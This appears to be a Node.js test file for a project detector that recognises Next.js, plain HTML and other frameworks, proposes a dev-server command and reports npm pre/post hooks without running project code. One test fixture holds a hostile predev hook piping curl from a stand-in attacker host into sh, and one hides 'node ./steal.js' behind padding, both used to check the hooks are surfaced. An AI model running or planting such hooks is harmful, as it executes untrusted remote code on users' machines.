import assert from 'node:assert/strict';
import { existsSync } from 'node:fs';
import { symlink, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { describe, it } from 'node:test';

import { detectProject } from '../../server/src/repo/detect.js';
import { HTML_FIXTURE, NEXT_FIXTURE, makeTree } from '../helpers/repo.js';

const NEXT_PKG = JSON.stringify({ dependencies: { next: '15.0.0', react: '19.0.0' }, scripts: { dev: 'next dev --turbopack' } });

/**
 * Detect a project made of `files`.
 * @param {Record<string, string>} files
 * @param {(dir: string) => Promise<void>} [prepare]
 */
async function detect(files, prepare) {
  const tree = await makeTree(files);
  try {
    await prepare?.(tree.dir);
    return await detectProject(tree.dir);
  } finally {
    await tree.remove();
  }
}

describe('detectProject: supported projects', () => {
  it('recognizes the Next.js App Router fixture and proposes its dev script', async () => {
    const found = await detectProject(NEXT_FIXTURE);
    assert.equal(found.framework, 'next-app');
    assert.equal(found.supported, true);
    assert.equal(found.label, 'Next.js (App Router)');
    assert.equal(found.app_dir, 'app');
    assert.deepEqual(found.dev_server, {
      command: 'npm run dev', script: 'next dev', script_clipped: false, also_runs: [], default_url: 'http://localhost:3000', package_manager: 'npm', dependencies_installed: false,
    });
  });

  it('recognizes the plain HTML fixture and proposes a static server on this machine only', async () => {
    const found = await detectProject(HTML_FIXTURE);
    assert.equal(found.framework, 'html');
    assert.equal(found.supported, true);
    assert.equal(found.app_dir, null);
    assert.deepEqual(found.dev_server, {
      command: 'python3 -m http.server 4173 --bind 127.0.0.1', script: null, script_clipped: false, also_runs: [], default_url: 'http://127.0.0.1:4173', package_manager: null, dependencies_installed: null,
    });
  });

  it('uses src/app when there is no app or pages folder at the root', async () => {
    const found = await detect({ 'package.json': NEXT_PKG, 'src/app/page.tsx': '' });
    assert.equal(found.framework, 'next-app');
    assert.equal(found.app_dir, 'src/app');
  });

  it('prefers app at the root over src/app, as Next.js does', async () => {
    const found = await detect({ 'package.json': NEXT_PKG, 'app/page.tsx': '', 'src/app/page.tsx': '' });
    assert.equal(found.app_dir, 'app');
  });

  it('says so when an App Router project also has a pages folder', async () => {
    const found = await detect({ 'package.json': NEXT_PKG, 'app/page.tsx': '', 'pages/old.tsx': '' });
    assert.equal(found.framework, 'next-app');
    assert.match(found.message, /pages folder; routes defined there are not mapped/);
  });

  it('recognizes Next.js by its config file when package.json does not list it', async () => {
    const found = await detect({ 'next.config.mjs': 'export default {}', 'app/page.tsx': '' });
    assert.equal(found.framework, 'next-app');
    assert.equal(found.dev_server.command, 'npx next dev');
    assert.equal(found.dev_server.package_manager, null);
  });

  it('names the package manager from the lock file and sees installed dependencies', async () => {
    for (const [lock, manager] of [['pnpm-lock.yaml', 'pnpm'], ['yarn.lock', 'yarn'], ['bun.lock', 'bun'], ['package-lock.json', 'npm']]) {
      const found = await detect({ 'package.json': NEXT_PKG, 'app/page.tsx': '', [lock]: '', 'node_modules/next/package.json': '{}' });
      assert.equal(found.dev_server.command, `${manager} run dev`, lock);
      assert.equal(found.dev_server.dependencies_installed, true);
    }
  });

  it('proposes "npx next dev" when the project has no dev script', async () => {
    const found = await detect({ 'package.json': JSON.stringify({ dependencies: { next: '15' }, scripts: { dev: '  ' } }), 'app/page.tsx': '' });
    assert.deepEqual([found.dev_server.command, found.dev_server.script], ['npx next dev', null]);
  });

  it('uses a plain HTML project\'s own dev or start script, and clips its text', async () => {
    const dev = await detect({ 'index.html': '', 'package.json': JSON.stringify({ scripts: { dev: 'serve .', start: 'other' } }) });
    assert.deepEqual([dev.dev_server.command, dev.dev_server.script, dev.dev_server.default_url], ['npm run dev', 'serve .', null]);
    const start = await detect({ 'index.htm': '', 'package.json': JSON.stringify({ scripts: { start: `serve ${'x'.repeat(1200)}` } }) });
    assert.equal(start.framework, 'html');
    assert.equal(start.dev_server.command, 'npm run start');
    assert.ok(/** @type {string} */ (start.dev_server.script).length <= 1000);
    assert.equal(start.dev_server.script_clipped, true, 'a clipped script is marked, so the user can be told');
    assert.equal(dev.dev_server.script_clipped, false);
  });

  it('names the pre and post scripts that the command also runs', async () => {
    const hooked = await detect({
      'index.html': '',
      'package.json': JSON.stringify({ scripts: { dev: 'serve .', predev: 'node ./setup.js && curl -s https://attacker.invalid/x | sh', postdev: 'node ./after.js', prestart: 'ignored' } }),
    });
    assert.equal(hooked.dev_server.command, 'npm run dev');
    assert.deepEqual(hooked.dev_server.also_runs, [
      { name: 'predev', script: 'node ./setup.js && curl -s https://attacker.invalid/x | sh' },
      { name: 'postdev', script: 'node ./after.js' },
    ]);
    const long = await detect({ 'index.html': '', 'package.json': JSON.stringify({ scripts: { dev: 'serve .', predev: `x${' '.repeat(1100)}; node ./steal.js` } }) });
    assert.equal(long.dev_server.script_clipped, true, 'a clipped pre script is marked too');
  });
});

describe('detectProject: everything else is named and not supported', () => {
  it('reports the Pages Router as not supported yet', async () => {
    for (const files of [{ 'pages/index.tsx': '' }, { 'src/pages/index.tsx': '' }, { 'pages/index.tsx': '', 'src/app/page.tsx': '' }]) {
      const found = await detect({ 'package.json': NEXT_PKG, ...files });
      assert.equal(found.framework, 'unsupported');
      assert.equal(found.supported, false);
      assert.equal(found.label, 'Next.js (Pages Router)');
      assert.match(found.message, /Pages Router, which is not supported yet\. The site can still be audited by its address/);
      assert.equal(found.dev_server.command, null);
    }
  });

  it('reports a Next.js project without an app folder', async () => {
    const found = await detect({ 'package.json': NEXT_PKG });
    assert.equal(found.label, 'Next.js');
    assert.match(found.message, /has no app folder/);
  });

  it('names other frameworks from package.json, even with an index.html at the root', async () => {
    const cases = [['astro', 'Astro'], ['nuxt', 'Nuxt'], ['@sveltejs/kit', 'SvelteKit'], ['vite', 'Vite'], ['react-scripts', 'Create React App']];
    for (const [dependency, label] of cases) {
      const found = await detect({ 'package.json': JSON.stringify({ devDependencies: { [dependency]: '1' } }), 'index.html': '' });
      assert.deepEqual([found.framework, found.label, found.supported], ['unsupported', label, false]);
      assert.match(found.message, new RegExp(`^This project uses ${label}, which is not supported yet\\. The site can still be audited by its address`));
    }
  });

  it('names projects it knows by a marker file', async () => {
    for (const [file, label] of [['wp-config.php', 'WordPress'], ['_config.yml', 'Jekyll'], ['hugo.toml', 'Hugo'], ['manage.py', 'Django']]) {
      const found = await detect({ [file]: '', 'index.html': '' });
      assert.deepEqual([found.framework, found.label], ['unsupported', label]);
    }
  });

  it('reports a folder without a web project', async () => {
    const found = await detect({ 'README.md': '# notes', 'docs/index.html': '' });
    assert.equal(found.framework, 'none');
    assert.equal(found.supported, false);
    assert.match(found.message, /No web project was recognized/);
    assert.equal(found.dev_server.command, null);
  });
});

describe('detectProject: package.json is data', () => {
  it('ignores a package.json that is not JSON or not an object', async () => {
    for (const text of ['{ not json', '[]', '"text"', 'null']) {
      const found = await detect({ 'package.json': text, 'index.html': '' });
      assert.equal(found.framework, 'html', text);
      assert.equal(found.dev_server.package_manager, null);
    }
  });

  it('ignores fields of the wrong type', async () => {
    const found = await detect({ 'package.json': JSON.stringify({ dependencies: 'next', scripts: ['dev'], devDependencies: null }), 'index.html': '' });
    assert.equal(found.framework, 'html');
    assert.equal(found.dev_server.command, 'python3 -m http.server 4173 --bind 127.0.0.1');
  });

  it('does not follow a package.json, an app folder or an index.html that is a symbolic link', async () => {
    const elsewhere = await makeTree({ 'package.json': NEXT_PKG, 'app/page.tsx': '', 'index.html': '' });
    try {
      const found = await detect({}, async (dir) => {
        await symlink(path.join(elsewhere.dir, 'package.json'), path.join(dir, 'package.json'));
        await symlink(path.join(elsewhere.dir, 'app'), path.join(dir, 'app'));
        await symlink(path.join(elsewhere.dir, 'index.html'), path.join(dir, 'index.html'));
      });
      assert.equal(found.framework, 'none');
    } finally {
      await elsewhere.remove();
    }
  });

  it('never runs anything from the project', async () => {
    let marker = '';
    const found = await detect({ 'app/page.js': '' }, async (dir) => {
      marker = path.join(dir, 'ran');
      const code = `require('node:fs').writeFileSync(${JSON.stringify(marker)}, '')`;
      await writeFile(path.join(dir, 'package.json'), JSON.stringify({ dependencies: { next: '15' }, scripts: { dev: `touch ${marker}`, postinstall: `touch ${marker}` } }));
      await writeFile(path.join(dir, 'next.config.js'), code);
      await writeFile(path.join(dir, 'app', 'page.js'), code);
    });
    assert.equal(found.framework, 'next-app');
    assert.equal(found.dev_server.script, `touch ${marker}`);
    assert.equal(existsSync(marker), false);
  });
});
